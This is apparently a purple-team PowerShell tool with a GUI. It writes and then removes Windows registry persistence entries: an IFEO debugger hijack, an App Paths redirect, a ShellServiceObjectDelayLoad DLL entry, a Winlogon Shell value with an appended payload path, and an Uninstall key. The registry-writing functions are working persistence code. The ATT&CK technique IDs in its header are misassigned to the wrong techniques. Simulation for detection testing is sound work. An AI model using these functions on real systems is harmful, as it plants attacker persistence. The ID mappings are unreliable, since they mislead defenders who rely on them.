<#
.SYNOPSIS
    GUI-based simulator and cleaner for registry hijack persistence techniques
.DESCRIPTION
    Provides both simulation and cleanup of various MITRE ATT&CK persistence methods:
      - T1546.004: IFEO Hijack
      - T1546.003: App Paths Hijack
      - T1547.009: ShellServiceObjectDelayLoad
      - T1547.001: Winlogon Shell Modification
      - T1547.004: Uninstall Key Manipulation
#>
Add-Type -AssemblyName System.Windows.Forms,System.Drawing

# Define functions
function Invoke-IFEOHijack { param($TargetExe='notepad.exe',$Debugger='C:\Windows\System32\cmd.exe')
    $key="HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\$TargetExe"
    New-Item -Path $key -Force | Out-Null
    New-ItemProperty -Path $key -Name 'Debugger' -Value $Debugger -Force | Out-Null
}
function Remove-IFEOHijack { param($TargetExe='notepad.exe')
    $key="HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\$TargetExe"
    Remove-Item -Path $key -Recurse -Force -ErrorAction SilentlyContinue
}
function Invoke-AppPathsHijack { param($App='calc.exe',$Path='C:\Windows\System32\mspaint.exe')
    $key="HKLM:\Software\Microsoft\Windows\CurrentVersion\App Paths\$App"
    New-Item -Path $key -Force | Out-Null
    New-ItemProperty -Path $key -Name '' -Value $Path -Force | Out-Null
}
function Remove-AppPathsHijack { param($App='calc.exe')
    $key="HKLM:\Software\Microsoft\Windows\CurrentVersion\App Paths\$App"
    Remove-Item -Path $key -Recurse -Force -ErrorAction SilentlyContinue
}
function Invoke-SSODL { param($Name='MySSODL',$Dll='C:\temp\evil.dll')
    $key='HKLM:\Software\Microsoft\Windows\CurrentVersion\ShellServiceObjectDelayLoad'
    New-ItemProperty -Path $key -Name $Name -Value $Dll -Force | Out-Null
}
function Remove-SSODL { param($Name='MySSODL')
    $key='HKLM:\Software\Microsoft\Windows\CurrentVersion\ShellServiceObjectDelayLoad'
    Remove-ItemProperty -Path $key -Name $Name -Force -ErrorAction SilentlyContinue
}
function Invoke-WinlogonShell { param($Shell='explorer.exe, C:\malicious\payload.exe')
    $key='HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon'
    Set-ItemProperty -Path $key -Name 'Shell' -Value $Shell -Force
}
function Remove-WinlogonShell { 
    $key='HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon'
    # Reset to default
    Set-ItemProperty -Path $key -Name 'Shell' -Value 'explorer.exe' -Force
}
function Invoke-UninstallKey { param($Name='EvilApp',$Uninstall='C:\temp\remove.exe')
    $key="HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\$Name"
    New-Item -Path $key -Force | Out-Null
    New-ItemProperty -Path $key -Name 'UninstallString' -Value $Uninstall -Force | Out-Null
}
function Remove-UninstallKey { param($Name='EvilApp')
    $key="HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\$Name"
    Remove-Item -Path $key -Recurse -Force -ErrorAction SilentlyContinue
}

# Build UI
$form = New-Object System.Windows.Forms.Form
$form.Text = 'Registry Hijack Simulator & Cleanup'
$form.Size = New-Object System.Drawing.Size(450,500)
$form.StartPosition = 'CenterScreen'

# Checklist of persistence techniques
$techniques = @('IFEO Hijack','App Paths Hijack','SSODL','Winlogon Shell','Uninstall Key')
$checks = @{}
$y=20
foreach($t in $techniques) {
    $chk = New-Object System.Windows.Forms.CheckBox
    $chk.Text = $t
    $chk.Location = New-Object System.Drawing.Point(20,$y)
    $chk.AutoSize = $true
    $form.Controls.Add($chk)
    $checks[$t] = $chk
    $y += 30
}

# Buttons
$btnSim = New-Object System.Windows.Forms.Button
$btnSim.Text='Simulate'
$btnSim.Location=New-Object System.Drawing.Point(50, $y)
$btnSim.Width=100
$form.Controls.Add($btnSim)

$btnClean = New-Object System.Windows.Forms.Button
$btnClean.Text='Cleanup'
$btnClean.Location=New-Object System.Drawing.Point(200, $y)
$btnClean.Width=100
$form.Controls.Add($btnClean)

# Action handlers
$btnSim.Add_Click({
    if($checks['IFEO Hijack'].Checked) { Invoke-IFEOHijack; Write-Host '[+] Simulated IFEO Hijack' }
    if($checks['App Paths Hijack'].Checked) { Invoke-AppPathsHijack; Write-Host '[+] Simulated App Paths Hijack' }
    if($checks['SSODL'].Checked) { Invoke-SSODL; Write-Host '[+] Simulated SSODL' }
    if($checks['Winlogon Shell'].Checked) { Invoke-WinlogonShell; Write-Host '[+] Simulated Winlogon Shell' }
    if($checks['Uninstall Key'].Checked) { Invoke-UninstallKey; Write-Host '[+] Simulated Uninstall Key' }
})
$btnClean.Add_Click({
    if($checks['IFEO Hijack'].Checked) { Remove-IFEOHijack; Write-Host '[+] Removed IFEO Hijack' }
    if($checks['App Paths Hijack'].Checked) { Remove-AppPathsHijack; Write-Host '[+] Removed App Paths Hijack' }
    if($checks['SSODL'].Checked) { Remove-SSODL; Write-Host '[+] Removed SSODL' }
    if($checks['Winlogon Shell'].Checked) { Remove-WinlogonShell; Write-Host '[+] Restored Winlogon Shell' }
    if($checks['Uninstall Key'].Checked) { Remove-UninstallKey; Write-Host '[+] Removed Uninstall Key' }
})

# Show form
[System.Windows.Forms.Application]::EnableVisualStyles()
[void]$form.ShowDialog()